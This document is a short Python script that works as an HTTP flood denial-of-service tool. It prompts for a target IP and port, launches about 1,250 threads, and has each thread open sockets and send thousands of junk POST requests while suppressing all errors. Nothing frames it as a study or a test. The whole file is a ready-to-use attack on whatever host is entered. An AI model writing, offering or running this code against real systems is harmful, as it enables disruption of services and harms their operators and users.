import socket,threading,random,string

def http_flood(ip,port):
    for _ in range(250):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.connect_ex((ip,port))
            packet = f'POST /{"".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
            for _ in range(2500):
                s.send(packet)
                s.sendall(packet)
        except:
            pass

ip = input("IP ?")
port = int(input("PORT ?"))
for _ in range(250*5):
    threading.Thread(target=http_flood,args=(ip,port)).start()